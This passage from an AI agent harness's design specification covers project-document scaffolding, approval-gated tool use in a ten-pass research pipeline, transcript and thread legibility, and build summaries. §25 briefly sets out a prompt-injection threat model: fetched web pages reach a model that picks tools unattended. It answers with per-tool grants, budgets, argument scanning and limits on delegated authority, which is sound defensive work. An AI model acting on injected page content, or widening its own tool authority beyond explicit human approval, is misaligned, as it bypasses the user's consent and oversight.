| **I8** | The agent produces **text**; the shell writes | Consent belongs to the shell (§20's V3), and a tool writing from inside the loop could not show a human a diff first. `initializer.md` gets `read_project_doc` and nothing else |
| **I9** | `/init` scaffolds a **set**, with `CONTEXT.md` as the hub and the only document in `.venastine/` | The rest are ordinary committed root files, where humans reading the repo will find them. The one file every agent reads is also the map of the ones it does not |
| **I10** | `CONTEXT.md` is generated in full; the others are **structured stubs** | A DEVLOG written for a project with no history, or an ARCHITECTURE describing code an agent skimmed once, is confident fiction in files that then get committed, linked from the hub and read as established fact. An honest empty section outperforms a plausible wrong one |
| **I11** | The index is generated, and is a **pure function of the kind** | Found by running the command twice. An index that marked which documents already existed changed on the second run purely because the first had created them — rewriting `CONTEXT.md` for no reason and defeating the "nothing to do" path — and the mark was false, labelling documents `/init` had authored moments earlier as preserved pre-existing work. Which files a run left alone is a fact about that RUN, and belongs in its report |
| **I12** | An existing document is **never** overwritten by the stub path | Only `CONTEXT.md` goes through diff-and-confirm, because it is the only file `/init` claims to author |
| **I13** | **Detect-then-confirm** for an established project; **ask outright** for a blank folder | With no manifests, no source and no docs there is nothing to infer from, so a proposal would be a guess wearing a finding's clothes. The proposal is a Python heuristic rather than a model call — a code manifest is a strong, checkable signal, and the user confirms either way |

### Acceptance criteria

1. Running `/init` on a trusted project leaves it trusted, without weakening the content hash. ✓ (I6)
2. The generated file is the user's to edit — regeneration must not silently overwrite hand-edits without saying so. ✓ (I4 revises rather than replaces; I5 diffs and asks; I12 never touches the other documents)
3. The write goes through the permission layer. ✓ (I1)

---

## 25. Authorized tool use in the research pipeline — BUILT

**Added and built after §18.** The ten-pass pipeline could not call **any** approval-gated tool, in any shell. This was structural, not a wiring oversight: `run_deep_research_mode` had no `permission_channel` parameter, so `_run()` always saw `None`, set `headless = True`, and `schemas(callable_only=True)` dropped every gated tool. Launching from the TUI's `/research` changed nothing. No MCP tool outside an `autoApprove` server was reachable from research, and neither was `spawn_subagent` after the §14–§18 review gated it. §15's `fetch_url` approval default was itself chosen around this limitation.

The goal was to lift that **without weakening the stance the harness holds**: no tool runs without an explicit human decision, the human sees what they are authorizing, and no lower-trust layer can loosen a gate (D14).

### The shape

Authorization is **two independent axes**, not a mode enum: a *grant set* (possibly empty) and an *`ApprovalProvider`* (possibly absent). Both absent is the default, and is exactly the pre-§25 behaviour — no existing invocation changes and no prompt appears unless one is asked for.

`core/approval.py` holds the data (`GrantBudget`, `ApprovalProvider`, `RunAuthorization`); `core/reasoning/authorization.py` holds the pipeline's policy and is shared by both shells; `core/loop.py` enforces; the shells build. The pipeline carries the bundle and interprets nothing.

### Decisions record (R1–R12)

| # | Decision |
|---|---|
| **R1** | **Per-tool selection**, not all-or-nothing. Unlike §18's S1, the pre-flight prompt is a shell-side question before the run, not the boolean `permission_channel` — so a subset is expressible here. |
| **R2** | **Only tools with no `approval_check` are name-grantable** (`registry.grantable`). A per-call gate was never consented to by name. **This narrows §18's shipped S1**, at the shared mechanism: a signed-off subagent calling `shell` now prompts its parent. |
| **R3** | `--grant` / `--grant-tools` are **per-run flags, never persisted**; `/research` takes the same values through the same parser. |
| **R4** | **`spawn_subagent` is excluded from pipeline grants** (`PIPELINE_UNGRANTABLE`). Approving a spawn *is* the §18 sign-off, so pre-granting it unattended compounds one yes into unbounded delegated authority across ten passes. |
| **R5** | **Argument-side content policy at `dispatch()`**, all tools, all modes, **refusing** rather than redacting. |
| **R6** | **`GrantBudget`**, `config.MAX_GRANTED_TOOL_CALLS = 150`, counting granted calls only. Exhaustion falls back to *asking*. One instance shared by reference across all passes. |
| **R7** | **Provenance framing** in the universal pass preamble. Defence-in-depth, explicitly **not** counted as a control. |
| **R8** | **No per-pass grant scoping.** The pass that wants a granted search tool is the pass ingesting the most untrusted content, so separation buys little for a per-pass `ToolContext` the orchestrator does not have. |
| **R9** | **Attended mode** via `ApprovalProvider`. Unanswered → **deny that call** after `config.ATTENDED_APPROVAL_TIMEOUT_S`, run continues. |
| **R10** | **Grants and attended compose.** Grants cover the boring set; anything ungranted asks instead of being denied. |
| **R11** | **Attended providers set `honour_run_scope = False`** — a mode whose purpose is granularity must not let one yes cover later calls. |
| **R12** | **The mode is persistable in `settings.json`; the grant list never is.** Asymmetric on purpose: a persisted mode can only ever ADD prompts, a persisted grant list only ever removes them — and `settings.json` is the one config file where project tier beats user tier. `research.granted_tools` is rejected *by name*. |

### Why the pipeline needed its own answer

It is the harness's highest prompt-injection surface by construction: it fetches web pages and feeds them to a model that then chooses tools, unattended, across ten passes. §23 reasoned identically when it decided the question tool denies headless. Two of the mitigations here are therefore not pipeline features at all but repairs to older gaps (R5): results were scanned for secrets and **arguments never were**, and `BLOCKED_DOMAINS` was enforced only by the two tools that opted into it.

### Acceptance criteria

1. An unflagged `--mode research` run behaves exactly as before: no prompt, no grants, every gated tool hidden. ✓
2. A granted tool is callable from a pass, and every use of it appears in `granted_calls.json`. ✓
3. A tool with an `approval_check` is never covered by a name-level grant, in the pipeline **or** in §18's subagent sign-off. ✓
4. Budget exhaustion asks (with a provider) or denies (without one) — never fails the run. ✓
5. Attended mode raises a prompt per call, ignores run-scope, and a timeout denies one call without killing the run. ✓
6. `research.granted_tools` in `settings.json` is rejected with a message explaining why it is absent. ✓
7. A credential-shaped argument, or a blocked-domain URL, is refused at `dispatch()` for a tool that imports nothing from `safety/`. ✓

---

## 26. Research legibility — pass internals, code stages, the claims view, colour, copy — BUILT

**Added after §22's first real ten-pass run**, which completed end to end and made five
things obvious that reading the code had not. All five are about *reading* a run rather
than running one, and they split cleanly: two are pipeline-level and reach both shells,
three are TUI presentation.

| # | What the run showed | Where it lives |
|---|---|---|
| 1 | Passes 4 and 6b appeared nowhere — and neither did D0, D1, D2 or Merge | `orchestrator.py` |
| 2 | A pass was opaque while it ran: fourteen tool calls over minutes looked like a hang | `core/loop.py` + `orchestrator.py` |
| 3 | Claims were readable only as prose; tier, grounding and assumption flags reached no shell | `tui/screens.py` |
| 4 | Everything was flat white, including the `you` label, which read as the first word of the message | `tui/themes.py` + `tui/widgets.py` |
| 5 | Text could not be selected at all | `tui/app.py` |

### Decisions record (L1–L6)

| # | Decision |
|---|---|
| **L1** | Tool calls and failed results reach the transcript; **streamed pass text does not**. Seven of the ten passes emit raw JSON, so streaming pass output buries the report under it. Only the volume escapes, as a throttled `pass_activity` total. This **amends §22 P2** — see the note in §22. |
| **L2** | **Every** zero-LLM stage is announced, not just the two that were noticed. D0/D1/D2/Merge were invisible for exactly the same reason, and fixing only the reported symptom leaves the panel with different gaps rather than none. `D2` emits once per **round**, not once per exhausted claim. |
| **L3** | Claims render in a scrollable modal (`/claims`, `ctrl+l`), taking plain dicts so the finished-run, stored-run and mid-run sources share one shape. |
| **L4** | Role-based palette resolved from the `Theme` object. Assistant label is `venastine ›`. |
| **L5** | `/copy [last\|report\|claims\|all] [--file <path>]`. OSC 52 cannot be confirmed, so `--file` is the route that provably worked. |
| **L6** | The CLI prints the new kinds too — a capability visible in one shell and not the other is the split this project keeps warning about. |

### What the build found

**There is no truthful step signal, so the feature became a different one.** §26 set out
to show "step N of a pass". `_run()` has no step marker to read: within a step it yields
`tool_call_start`/`tool_result` in pairs, and between steps it yields nothing at all
unless the model happened to stream text. Inferring a boundary from that interleaving
would be a guess presented as a fact, and a real marker means growing `LoopEvent`, which
P1's test forbids. So the panel counts `tool_call` events itself — derivation, not a
second writer — and `pass_activity` covers the passes that call no tools.

**Tool arguments were the one unredacted path.** §25 R5 added `check_input_policy()`,
but that **refuses** a call rather than redacting one, and `dispatch()`'s
`check_output_policy` only ever saw results — so a `fetch_url` whose url carried an API
key would have been printed verbatim in both shells the moment tool calls became
visible. Redaction runs before truncation, because truncating first can cut a credential
below the 20 characters its pattern needs.

**A `for` loop over a generator silently discards its return value**, and `thread_id` is
attached after the pass's loop finishes. `_translate` uses `next()` for that reason; the
`for`-loop version passes every test about tool events and breaks §3's JSON retry
invisibly.

**Twenty-two test doubles stopped intercepting, silently — again.** §22 recorded this
with twelve; §26 hit it with fifteen `run_deep_research_mode` patches plus seven more in
shared fixtures using a different spelling. Repointed through one `conftest.pass_stream`
helper rather than open-coded at each site, and the three transcript stubs needed the
new write methods for the same class of reason.

**`ctrl+k` would have been shadowed.** Textual's `Input` binds it to `delete_right_all`
and holds focus almost always, so the obvious key for a claims view would have silently
deleted the rest of the typed line. `ctrl+l` verified free against the installed version
per D22, and pinned by a test that presses the key with text in the input.

### Acceptance criteria

1. A pass's tool calls, and its failed results, reach a consumer as `PipelineEvent`s while the pass is still running — with parameters redacted. ✓
2. Every zero-LLM stage emits exactly one `stage` event; `D2` emits once per retry round however many claims it disposes of. ✓
3. `run_deep_research_mode()` is unchanged in signature and return type, and remains what every non-observing caller uses. ✓
4. Colour comes from theme variables only, so all eight themes restyle without edits, and a widget renders unstyled rather than raising when there is no running app. ✓
5. Text is retrievable from the session without terminal selection, by a route whose success is not overclaimed. ✓
6. Both shells render the new kinds. ✓

---

## 27. Thread legibility — resume actually resumes, and a thread knows what it is — BUILT

**Added after §26's first live TUI session.** Two bugs, both about threads, independent of
each other, and both found by using the app rather than by reading it.

| # | What the session showed | Where it lives |
|---|---|---|
| 1 | Resuming a thread (ctrl+t) displays nothing — and leaves the *previous* thread's transcript on screen under the new thread's id | `tui/app.py` + `tui/widgets.py` |
| 2 | The picker lists far more threads than there have ever been conversations | `storage.py` |

**Bug 1 is display-only.** `action_pick_thread`'s `chosen()` callback swaps `self.memory`,
refreshes the goal banner, writes `Resumed thread <uuid>.` and stops. The data loads
correctly — `ConversationMemory(thread_id=...)` reads the full history at construction —
but nothing renders it and nothing clears what was already on screen. `main.py`'s
`--thread` path has the identical gap, which §26's L6 makes in scope rather than optional.

**Bug 2 is not what it looks like.** `core/loop.py`'s `stream_deep_research_mode` builds a
bare `ConversationMemory()` per pass, so one research run creates ~10 threads, plus up to
4 more for the 6a/6c retry rounds, plus the §20 reviewer's. **That is a locked invariant,
not the defect** — "each pass gets its own fresh thread; passes share distilled JSON,
never raw history" is what stops a later pass reading how an earlier one argued. The
defect is that `ConversationThread` has no field saying what a thread *is*, so
`list_threads()` returns pass threads and conversations undifferentiated.

### Decisions record (T1–T9)

| # | Decision |
|---|---|
| **T1** | Threads carry a `kind` (`chat` / `research_pass` / `subagent`); the picker lists `chat` only. A **column**, not `extra_data` — that field exists and needs no migration, but it is an opaque JSON blob, so filtering would mean loading every row and testing in Python. `list_threads()` is the one query that must scale with a database gaining ten rows per run. |
| **T2** | Pass thread ids are recorded on the run (`PipelineRun.pass_threads`), so hiding a pass thread from the picker does not make it unreachable. A `list[dict]`, matching `granted_calls` and `subagent_reviews` — a nested dataclass would force every `vars(run)`/`vars(c)` site to `asdict()` in one change. |
| **T3** | Replay renders the **archive** (`storage.archive_history`), never the derived view. `memory.messages` begins with the synthesized `SUMMARY_PREFIX` message on any compacted thread, and replaying it would render harness-generated text under a `you ›` label — precisely what M8 says that message must never be mistaken for. |
| **T4** | Replay shows user/assistant text in full and each tool call as a one-line marker; tool **results** are skipped. A grounding-heavy thread would otherwise replay thousands of lines of fetched page text. |
| **T5** | Both shells replay. §26's L6 again. |
| **T6** | The legacy classification runs **at every launch**, from `main.py` right after `create_db_and_tables()` — not once behind a persisted marker, and not as an explicit command. It is idempotent by construction (it only ever moves rows still `chat` inside a *finished* run's window), so a repeat run is a no-op, there is no marker state to get wrong, and a database last opened by an older build is still classified. A command-only version leaves the picker cluttered until someone knows to run it, which is the bug. |
| **T7** | The §20 reviewer's thread is **`subagent`**, not a fourth kind. §20 already calls it a subagent and it runs through the same entry point. Consequence, accepted: the structural classifier labels *legacy* reviewer threads `research_pass` (they were created inside the run window) while new ones are `subagent` — the two disagree about old rows, and it does not matter, because both kinds are hidden from the picker. |
| **T8** | AC6's "reachable from the run" means **persisted and displayed**: `pass_threads` on the record, in `load_pipeline_run()`, and as `output/<run_id>/pass_threads.json`. Resuming by id already works for any kind (`get_thread()` does not filter), so `--thread <pass uuid>` needs nothing further. A picker mode listing every kind was rejected — it re-introduces the ten-rows-per-run list AC2 exists to remove, behind an opt-in nobody would want twice. |
| **T9** | A picker row leads with a **truncated first user message**. Beyond the stated ACs, and included because bug 2's actual complaint was that the picker could not be used: filtering makes it correct, and a list of timestamps and uuids is still not answerable. Read from the archive (T3's reasoning) and costing one extra query for the whole list, not one per row. |

### What this repeats, and must not

- **`ensure_columns()` is additive only** (M7) and explicitly never backfills. So every
  existing row takes `kind='chat'` from the default, and the hundreds of pass threads
  already in a user's database would still clutter the picker. That needs a **separate,
  idempotent one-time classification**, not a widening of `ensure_columns`' contract — if
  that function ever grows a `DROP` or a backfill, the project has outgrown it.
- **The classification signal is structural, not heuristic:** a thread created between a
  `PipelineRunRecord`'s `started_at` and `finished_at` is a pass thread of that run. A
  chat thread cannot be created in that window — the CLI is blocked inside the pipeline
  call, and the TUI's `_busy` guard already refuses `/new` and thread switching mid-run.
  A run with `finished_at IS NULL` (§22's abandoned-generator case, which deliberately
  leaves `status='running'`) has no closing bound, so **those threads stay `chat`**.
  Under-classifying leaves a straggler in the picker; over-classifying hides a real
  conversation, and only one of those is recoverable by the user.
- **`_param_digest` must not be copied.** §26 established redact-*then*-truncate because
  truncating first can cut a credential below the 20 characters its pattern needs. It is
  currently private to `orchestrator.py`; the replay renderer is its second caller, so it
  moves to a shared home beside `redact_secrets`. A second copy is how that ordering
  silently regresses in one of them — the project's canonical "fix at the producer" bug.
- **`ConversationMemory` must not learn about `kind`.** It owns active in-run state and
  must stay unaware of what data exists; that is `storage.py`'s boundary. The kwarg goes
  `loop → storage.create_thread`, passing through `__init__` and nothing more.
- **Resuming must reset per-thread state.** `_last_run` and `_live_claims` survive a
  thread switch today, so `/claims` after a resume would show the *previous* thread's run.
  Exactly the class of bug the goal banner already fixed in this same callback.

### Acceptance criteria

1. `create_thread()` defaults to `chat`; a research pass creates `research_pass`; a subagent creates `subagent`.
2. `list_threads()` returns conversations only; `list_threads(kind=None)` returns everything.
3. `ensure_columns()` adds `kind` to a database created without it, and the one-time classification labels a thread created inside a run's window while leaving one created outside it — and one belonging to an unfinished run — alone.
4. Resuming a thread replays its history, clears what was on screen, and resets `_last_response`, `_last_run` and `_live_claims` to the resumed thread.
5. Replaying a **compacted** thread shows the original first user message, not the summary.
6. Both shells replay, and a run's pass threads are reachable from the run.

---

## Open Questions — None Remaining

**(Rev. 3, final)** This document opened by describing itself as "a complete, no-design-decisions-left specification." As of this revision that is actually true: every open question has been answered, and what's left below needs checking against code rather than deciding.

The three that were still open at the start of Rev. 3 are now locked as **D25** (memory scope defaults to `"project"`), **D26** (`remember()` requires approval, `pin()` doesn't), and **D27** (compaction hyperparameters ship as overridable defaults rather than fixed constants). Their reasoning lives in the decisions record and in §21; it isn't repeated here.

Earlier in Rev. 3, three more were closed by verification rather than by choice, recorded so nobody re-derives them:

- **Per-model context window size** — a static `MODEL_CONTEXT_WINDOWS` table with a warned fallback for `context_limit`, plus the provider-reported `usage["input_tokens"]` for `context_used` (§21). A per-provider query was rejected: thirteen providers, no uniform endpoint, and thirteen adapters would still need the fallback constant at the end of it.
- **MCP SDK call shapes** — v1.x confirmed, and the check surfaced a live major-version boundary now handled by D22's pin, plus two bugs in the sketch that had nothing to do with the original question (§17).
- **§13's unconfirmed "8 tests"** — the estimate was right; the full inventory is inline in §13's acceptance criteria so it never needs re-deriving.

**What this means for sequencing.** Nothing in this document is now blocked on a decision. §21 (memory), which was the section carrying the most open weight, is fully specified. The remaining risk is entirely in implementation and verification, which is where it should be.

### Verification items (not decisions)

Distinct from the above — these need checking against real code at a specific point, but nobody has to choose anything:

- ~~**`AgentManager`'s method surface vs. what §20 calls on it**~~ (was Open Question 3). **CLOSED at §20's build**, both sides now existing: the call sites are `get()`, `active_context()` and `system_prompt_for()`, all present on `AgentManager`, none needing a signature change. The flagged mismatch was not real.
- **Re-verify the pinned `mcp` version's client API** against §17's call shapes at implementation time (D22). The version boundary was live when this was written, so this document's snapshot has a short shelf life by construction.

### Lower-priority items tracked but not re-litigated in this revision

These came from the tool-assisted review pass, assessed as real but either already addressed by a decision above or genuinely lower-stakes — listed here so they aren't silently lost, not because they need a decision right now:

- Parameter naming consistency (`system_prompt_override` vs `system_prompt`) across §18's agent-invocation code paths — a naming cleanup, not a design question.
- MCP server connections during `connect_all()` could run in parallel rather than sequentially — a performance refinement once §17 exists to optimize. **(Rev. 3)** Note this interacts with the `AsyncExitStack` design: parallel connection is `asyncio.gather` over the per-server enters, all still on the single MCP loop, so it stays compatible.
- Test infrastructure for the streaming (§13), async bridge (§17), and TUI (§16) pieces needs its own planning pass once those are being built — flagged as real work, not deferred as unimportant. **(Rev. 3)** Two constraints on that pass are now known: §13's tests must assert against persisted `MessageLog` state and against `total_tokens_used`, not only against returned `ModelResponse` objects (D20, D21 — both failure modes are invisible to return-value assertions); and if §17 ends up on the SDK's v2 line, its in-memory transport removes the need to spawn real subprocesses for bridge tests entirely.
- `run_to_completion()`'s exact placement was open in Rev. 1 (S16) — resolved above (`core/loop.py`).
- **(Rev. 3, SETTLED at the §19 build as K7 — no refresh)** `registry.schemas(allowed_tools)` is computed once at the top of `_run()` and never refreshed. Activation happens *between turns* via a slash command, and `_run()` is called once per turn, so it recomputes schemas before every turn that could be affected — a turn can never hold a tool list that went stale during it. Two things would reopen this: a tool that activates a skill (making activation mid-turn), or MCP servers connecting after startup. Neither exists; if either is built, revisit here rather than rediscovering it as a bug.

  Note the §19 answer does not depend on this: `additional_tools` is a precondition, not a grant (K2), so activating a skill does not change the tool set at all. The refresh question is only about runtime `register()`/`unregister()`.

---

## Why these calls, not just what they are

A few threads of reasoning run through several decisions above and are worth carrying forward as habits, not just conclusions. The first three are inherited from the project's existing practice; the last two are what Rev. 3's verification pass added.

**"Distill, don't share raw history."** Established by the research pipeline (each pass gets its own thread; only a distilled result carries forward), and it independently validates two later designs: a subagent returns only `response.text` to its parent (§18), and §20 passes the pipeline's already-distilled `trace` rather than raw per-pass conversations. Apply the same lens to anything new that spans conversation threads — §21's compaction is the newest instance.

**"When a fix is a special case bolted onto a consumer, the real fix belongs one layer down, at the producer."** From `core/memory.py`'s history: a resume-shape bug was fixed for `role == "assistant"` via a read-side special case, while the identical root cause in `add_tool_result` went uncaught. Fixing what gets *written* closed it for every role at once. The same shape recurs twice in this document: MCP being async is a reason for one bridge at the one async boundary (D2a), not for making every tool handler async; and MCP returning `CallToolResult` is a reason for one normalization at the bridge (D23), not for teaching `check_output_policy`, `add_tool_result`, and every future consumer about MCP types.

**Convergent findings are high-confidence; single-method findings are "credible, verify."** Rev. 2 noted that manual tracing and a tool-assisted review pass independently landed on the same three issues. Rev. 3 is the corollary: of the items only one method had flagged, some were confirmed exactly (the "8 tests" estimate), and some were confirmed *and* turned out to be larger than described (the MCP call shapes, which were flagged as "check the signatures" and actually concealed a version boundary, a session-lifetime bug, and a result-type mismatch). Treat "worth a targeted verification" as a real work item with unbounded upside, not a formality.

**(Rev. 3) An abbreviated restatement of existing code is a proposal to delete whatever it abbreviates.** This document's code blocks serve two different purposes that look identical on the page: some specify new code, and some restate existing functions in order to change one part of them. The second kind is dangerous, because everything omitted for brevity reads as everything the function does. Rev. 2 hit this three times — `dispatch()` lost `check_output_policy()` and the unknown-tool guard, `_run()` lost its persist-before-branch ordering, and the wrapper list lost `continue_conversation()`. Two of the three would have silently removed a documented bug fix, and one would have removed a security layer. **The rule: before implementing from a sketch that modifies an existing function, diff it against the real implementation.** Where a section here does that, it now says so explicitly.

**(Rev. 3) A defensive default is only safe where absence is impossible.** `getattr(permissions, tool_name, False)` and `getattr(usage_obj, "input_tokens", 0)` are both reasonable-looking defensive reads, and both produce silent, invisible failures the moment the thing they're defending against actually happens — `fetch_url` permanently denied because a field was never added (D24), token budgets pinned at zero because a streaming API reports usage differently (D21). Neither errors; both just quietly do the wrong thing forever. This is the exact inverse of the project's established loud-failure pattern (`credentials.py` raising rather than defaulting, `get_thread` raising on an unknown id). Where a default *is* meaningful — `_default_for_unknown_tool()` for dynamically-named MCP tools — give it a name and a docstring so it reads as a decision rather than as an accident.

---

## Dependency Graph

```
§13 (streaming) ──┐
§14 (file syntax + trust) ─┼──→ §16 (TUI) ──→ §17 (MCP)
§15 (permissions) ─┤                  │
                   │                  ↓
                   ├──→ §18 (agents) ──→ §20 (subagent review)
                   │
                   └──→ §19 (skills)

§21 (memory) — needs §14 (agents/builtin/ for compactor.md) and §13 (compaction retry reuses the JSON-retry-style pattern) but is otherwise independent of §16-§20
```

**Recommended build order:** §13 + §14 + §15 (foundation, parallel) → §16 (TUI) → §17 (MCP) → §18 (agents) → §19 (skills) → §20 (subagent review) → §21 (memory, though it only strictly needs §13+§14 and could move earlier if prioritized).

---

## New Dependencies Summary

| Package | Phase | Purpose | Notes |
|---|---|---|---|
| `pyyaml` | §14 | YAML frontmatter parsing | Pin explicitly |
| `textual` | §16 | TUI framework | Major new dependency |
| `mcp` (official SDK) | §17 | MCP client protocol | **Pin with an upper bound (D22)** — `mcp>=1.27,<2` if targeting the v1.x client API §17 is written against. The SDK is mid-major-version transition and its own README instructs dependents to add the `<2` bound. Async-only in both lines — see D2a for why that doesn't make the rest of the harness async |

---

## New Files Summary

| File | Section | Purpose |
|---|---|---|
| `core/events.py` | §13 | `LoopEvent` types |
| `core/workspace_trust.py` | §14 | Project directory trust gate |
| `core/config_loader.py` | §14 | `.md`/`.json` discovery + frontmatter parser + D27's settings resolution order (config → user → project → per-invocation), with range validation |
| `tools/context.py` | §15 | `ToolContext` dataclass |
| `tui/app.py`, `tui/widgets.py`, `tui/commands.py` | §16 | Textual app, widgets, slash commands |
| `mcp/client.py`, `mcp/config.py` | §17 | MCP client (with async bridge) + `mcp.json` loader |
| `agents/manager.py`, `agents/subagent_tool.py` | §18 | Agent lifecycle + `spawn_subagent` tool |
| `agents/builtin/*.md` | §18, §21 | Built-in agents, including `compactor.md` |
| `skills/manager.py`, `skills/builtin/*.md` | §19 | Skill lifecycle + 4 default skills |
| `core/memory_manager.py` | §21 | Compaction trigger/checkpoint logic |

---

## Modified Files Summary

| File | Section | Change |
|---|---|---|
| `core/client.py` | §13 | Add `call_model_stream()` — **three provider implementations** (Anthropic typed events, Google chunked candidates, OpenAI-compatible index-accumulated tool-call fragments), plus `collect_response()` and D21's usage-or-raise handling |
| `core/loop.py` | §13, §15, §18 | `_run()` → generator (preserving D20's persist-before-branch ordering); `run_to_completion()`; accept `permission_channel`, `tool_context`. **Three** wrappers convert, not two — `run_agent_conversation`, `run_deep_research_mode`, **`continue_conversation`** |
| `core/memory.py` | §21 | Ordinal→row-id resolution for `pin`; checkpoint-aware history load (leading summary + uncompacted tail) |
| `core/reasoning/orchestrator.py` | §20 | Subagent review after pipeline |
| `core/reasoning/base.py` | §20 | `subagent_reviews` field on `PipelineRun` |
| `security/permissions.py` | §15 | "Stricter wins" — context-aware `is_tool_allowed()`/`requires_approval()`, dynamic-tool default handling |
| `tools/registry.py` | §15 | Runtime `register()`/`unregister()`, `dispatch(context=)`, approval OR-composition. **Preserve the unknown-tool guard and the `check_output_policy()` call** (Rev. 3 correction); add D24's import-time permission-declaration check |
| `storage.py` | §21 | New `pinned` column on `MessageLog`; new `CompactionCheckpoint`, `UserMemory` tables; **`get_session_history(after_message_id=...)`** for loading the uncompacted tail |
| `config.py` | §14, §20, §21 | New constants for subagent review, compaction defaults (D27 — overridable, not fixed), `MODEL_CONTEXT_WINDOWS`/`DEFAULT_CONTEXT_WINDOW`. New `ToolPermissions`/`ToolApprovals` fields for `pin` and `remember` (D26) and for **`fetch_url`, currently missing and denied as a result** (D24 — confirm intended defaults) |
| `providers.json` | §13 | Per-provider `supports_stream_usage` flag — same shape as the existing `is_v1_compatible`, needed because some v1-compatible providers reject `stream_options` outright (D21) |
| `main.py` | §16 | `--tui` / `--no-tui` flags; wire MCP `disconnect_all()` into the existing shutdown path |
| `requirements.txt` | §14, §16, §17 | `pyyaml`, `textual`, `mcp` (**pinned with an upper bound, D22**) |
| `tests/BREAKING_CHANGES.md` | §13 | Update §68's `_run()` entry — the generator conversion is a breaking change to all 8 direct-calling tests |
